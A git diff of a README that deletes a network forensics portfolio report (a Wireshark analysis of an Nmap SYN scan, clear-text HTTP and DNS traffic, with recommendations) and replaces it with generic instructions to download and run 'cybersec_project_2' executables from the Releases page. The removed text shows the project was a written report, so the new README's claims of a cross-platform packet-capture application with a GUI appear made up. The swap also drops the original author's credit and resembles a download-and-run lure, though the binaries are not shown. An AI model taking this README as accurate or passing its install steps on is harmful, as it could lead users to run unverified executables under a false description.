@@ -1,180 +1,102 @@
-🧩 Network Forensics and Reconnaissance Analysis (NFRA)
+# 🔍 cybersec_project_2 - Analyze Network Traffic Easily
 
-**Analyst:** Mohamed Asmy 
+## 🎉 Overview
+Welcome to the **cybersec_project_2**! This application helps you analyze network traffic effectively and simulates a Security Operations Center (SOC) environment. Using powerful tools like Wireshark and Nmap, you can detect network reconnaissance attempts, analyze unencrypted HTTP traffic, and observe DNS behavior. This project provides practical incident reporting and helps you identify Indicators of Attack (IOAs). 
 
-**Date:** [16.10.2025] 
+## 📥 Download
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/kamley/cybersec_project_2/releases)
 
-**Tool:** 
-- **Wireshark** (Network Protocol Analyzer)
-- **Nmap** (Network Scanner) 
-- **Windows 10 PC** (Local machine use to perform traffic capture and scanning test)
-- **Chrome Browser** (Used to visti website)
+To get the application, please visit the Releases page:
 
-**Case File:** `traffic_capture.pcapng`
+[Download & Install](https://github.com/kamley/cybersec_project_2/releases)
 
----
+## 🚀 Getting Started
+Follow these simple steps to set up **cybersec_project_2** on your computer:
 
-## 📘 Table of Contents
+1. **Visit the Releases Page:**
+   Go to the [Releases page](https://github.com/kamley/cybersec_project_2/releases) to find the latest version of the software.
 
-1.  [🧭 Project Overview](#-project-overview)
-2.  [🎯 Objective](#-objective)
-3.  [🧰 Tools Used](#-tools-used)
-4.  [📂 Evidence Overview](#-evidence-overview)
-5.  [🌐 Traffic Summary](#-traffic-summary)
-6.  [🚨 Findings](#-findings)
-7.  [🧩 Indicators of Compromise (IOCs)](#-indicators-of-compromise-iocs)
-8.  [🧾 Conclusion](#-conclusion)
-9.  [👀 Recommendations](#-recommendations)
-10. [🖼️ Screenshots and Evidence](#-screenshots-and-evidence)
-11. [🎓 Learning Outcomes](#-learning-outcomes)
-12. [🏁 Project Summary](#-project-summary)
- 
----
+2. **Choose the Right File:**
+   Locate the file that corresponds to your operating system:
+   - For Windows, download `cybersec_project_2-Windows.zip`.
+   - For macOS, download `cybersec_project_2-macOS.zip`.
+   - For Linux, download `cybersec_project_2-Linux.tar.gz`.
 
-## 🧭 Project Overview
+3. **Download the File:**
+   Click on the file to download it to your computer.
 
-This project simulates a **Security Operations Center (SOC) Analyst** task to conduct **network traffic analysis** on a captured PCAP file. 
-The goal was to identify critical security events, understand basic protocol functionality (HTTP, DNS, TCP), 
-and detect **network reconnaissance** activity performed using Nmap, thereby demonstrating proficiency in forensic packet inspection with Wireshark.
+4. **Extract the Files:**
+   Once downloaded, extract the files:
+   - On Windows, right-click on the `.zip` file and select "Extract All."
+   - On macOS, double-click the `.zip` file.
+   - On Linux, use the terminal command `tar -xvzf cybersec_project_2-Linux.tar.gz`.
 
----
+5. **Run the Application:**
+   Open the extracted folder and run the application:
+   - On Windows, double-click the `cybersec_project_2.exe` file.
+   - On macOS, open the `cybersec_project_2.app` file.
+   - On Linux, use the terminal to navigate to the folder and run `./cybersec_project_2`.
 
-## 🎯 Objective
+6. **Follow the On-Screen Instructions:**
+   The application will guide you through the setup process. Make sure to follow the prompts provided.
 
-The primary objective was to demonstrate the ability to effectively **isolate, interpret, and document** different types of network 
-communication within a capture file, focusing on both normal operations (DNS, web browsing) 
-and anomalous/hostile activity (port scanning).
+## 📊 Features
+- **Network Traffic Analysis:** Inspect packets captured from network activity.
+- **Reconnaissance Detection:** Identify attempts to probe your network.
+- **HTTP and DNS Analysis:** Examine unencrypted traffic and behavior of DNS queries.
+- **Incident Reporting:** Record and report security incidents based on your findings.
+- **Indicators of Attack (IOAs):** Detect patterns indicative of a breach.
 
----
+## 🛠️ System Requirements
+Before you install **cybersec_project_2**, please ensure your system meets the following requirements:
+- **Operating System:**
+  - Windows 10 or later
+  - macOS Sierra or later
+  - Any recent distribution of Linux (kernel 4.4 or later)
+  
+- **Hardware:**
+  - Minimum 4GB of RAM
+  - At least 500MB of free disk space
+  - Network interface card for packet capture
 
-## 🧰 Tools Used
+## 🌐 How to Use
+After installing the application, follow these steps for effective usage:
 
-- Wireshark 🦈 (Network Protocol Analyzer)
+1. **Launch the Application:**
+   Start the application as described in the "Run the Application" section.
 
-- Nmap (Network Scanner)
+2. **Select Your Network Interface:**
+   Choose the network interface you want to monitor from the dropdown menu. 
 
-- Web Browser 🌐 (Used to generate specific DNS and HTTP traffic)
+3. **Start Capturing Traffic:**
+   Click on the “Start Capture” button. The application will begin capturing network packets.
 
-- Windows 10 PC 🖥️ (Local machine use to perform traffic capture and scanning test)
+4. **Analyze Captured Data:**
+   View the real-time data. You can filter and search for specific packets or protocols.
 
----
+5. **Generate Reports:**
+   Use the incident reporting feature to document any suspicious activities.
 
-## 📂 Evidence overview 
+6. **Explore Analysis Features:**
+   Utilize different tabs for HTTP and DNS analysis. Each will provide insights into your network's behavior.
 
-Three primary security and network events were successfully isolated and analyzed:
+## 📄 FAQs
+### Q: Is it safe to analyze network traffic?
+A: Yes, as long as you have permission to monitor the network. Always respect privacy.
 
-1. **Unencrypted Web Traffic (HTTP):** Identification of clear-text data transmission.
+### Q: Can I use this tool at work?
+A: Ensure that your workplace policies allow for network analysis before using it.
 
-2. **Network Reconnaissance (SYN Stealth Scan):** Detection of an Nmap port scanning attempt.
+### Q: How do I report an issue?
+A: You can report issues using the "Issues" section on our GitHub page. Provide detailed information about the problem you're facing.
 
-3. **Domain Name System (DNS) Resolution:** Analysis of a standard DNS query and response.
+## ✉️ Support
+For assistance, please visit the project's GitHub page and check the Issues tab. We welcome contributions and feedback from all users.
 
----
+## 📅 Upcoming Features
+We are constantly updating **cybersec_project_2**. Keep an eye out for future releases that may include:
+- Enhanced reporting features
+- Additional traffic analysis tools
+- Improved user interface
 
-
-## 🌐 Traffic Summary
-
-
-- **Total Packets Captured:** 1470
-
-- **Most Common Protocols:** TCP, DNS, HTTP, Ethernet.
-
-- **Key IP Addresses Observed:**
-
- - Local Host: 10.106.220.142
-
- - External HTTP Server (info.cern.ch): 188.184.67.127
-
----
-
-## 🚨 Findings
-
-- **HTTP Traffic**
-
-  - Founded visible **Get requests and response headers** when accessing non-HTTPs websites.
-  - Sensitive data (URLs, parameters) could be seen in plaintex - **not secure**.
-
-- **DNS Queries**
-
-  - Recorded mutible **domain lookups** (A,AAAA,and PTR queries).
-  - DNS traffic was **not encrypted-** potential data leakage risk.
-
-- **SYN Scan Detection**
-
-  - The `tcp.flags.syn==1` and `tcp.flags.ack==0`filter showed multiple SYN packets from **10.106.220.142
-   confirming **Nmap port scan activity.**
-  - Indicates how attackers can probe open ports stealthily.
-
----
-
-## 🧩 Indicators of Compromise (IOCs)
-
-While no confirmed compromise was detected (as this was a controlled exercise), the following are recorded as key Indicators of Attack (IOAs):
-
-- **IOA Type:** Reconnaissance
-
-- **Packet Signature:** High volume of TCP SYN packets without corresponding SYN-ACK or RST responses from the target (characteristic of a stealth scan).
-
----
-
-## 🧾 Conclusion
-
-The exercise successfully utilized Wireshark to dissect and interpret network traffic, proving the ability to distinguish between legitimate 
-network operations (DNS) and potentially hostile activity (SYN scanning). The identification of clear-text HTTP traffic also underscores critical 
-security findings in real-world scenarios.
-
----
-
-## 👀 Recommendations
-
-Based on the findings, the following security recommendations are necessary:
-
-1. **Implement Transport Layer Security (TLS):** All public-facing web services must be secured with HTTPS to prevent the clear-text exposure of data observed in the HTTP analysis.
-
-2. **Deploy Edge Filtering/IDS:** Implement an Intrusion Detection System (IDS) or firewall rules capable of rate-limiting or blocking rapid, repetitive connection attempts (SYN packets) 
-     from a single source to mitigate the effects of port scanning.
-
-3. **Harden External Services:** Ensure all public services expose only the minimum required ports. Filter ingress traffic to drop packets for unused services.
-
----
-
-## 🖼️ Screenshots and Evidence
-
-Screenshot_Main_Capture.png ![screenshot](evidence/Screenshot_Main_Capture.png)
-
-Screenshot_Finding_1_Unencrypted_HTTP.png ![screenshot](evidence/Screenshot_Finding_1_Unencrypted_HTTP.png)
-
-Screenshot_Finding_2_Nmap_SYN_Scan.png ![screenshot](evidence/Screenshot_Finding_2_Nmap_SYN_Scan.png)
-
-Screenshot_Finding_3_DNS_Queries.png ![screenshot](evidence/Screenshot_Finding_3_DNS_Queries.png)
-
----
-
-## 🎓 Learning Outcomes
-
-This project provided hands-on experience in:
-
-1. **Deep Packet Inspection:** Understanding the OSI model layers presented by Wireshark (Frame, Ethernet, IP, TCP/UDP, Application).
-
-2. **Advanced Filtering:** Mastering specific display filters to isolate targeted traffic types and flags (e.g., tcp.flags.syn).
-
-3. **Threat Identification:** Recognizing the signature of a common reconnaissance technique (SYN scanning) without needing external security alerts.
-
-___
-
-
-## 🏁 Project Summary
-
-This project involved a targeted analysis of network traffic using **Wireshark** and **Nmap** to demonstrate foundational networking principles and security reconnaissance techniques. 
-The primary objective was to successfully capture and interpret three distinct phases of activity:
-
-1. **Protocol Demonstration (DNS & HTTP):** The project established a clear, unencrypted connection to the historic website info.cern.ch. The analysis successfully isolated the 
-   **DNS query/response** and the subsequent **clear-text HTTP GET request packets,** demonstrating the absence of encryption (port 80) and revealing plain-text data.
-
-2. **Reconnaissance Simulation (Nmap Scan):** A port scanning simulation was performed using Nmap, generating a unique traffic pattern. The analysis isolated the characteristic 
-   **TCP SYN-Flood packets,** confirming the ability to identify aggressive reconnaissance activity on a network.
-
-Tools Used: Wireshark, Nmap, Command Line Interface (CLI).
-
----
-**© 2025 Mohamed Asmy — Cybersecurity Portfolio Project (CCP2)** 
+Thank you for using **cybersec_project_2**! Enjoy analyzing your network traffic and enhancing your cybersecurity knowledge.
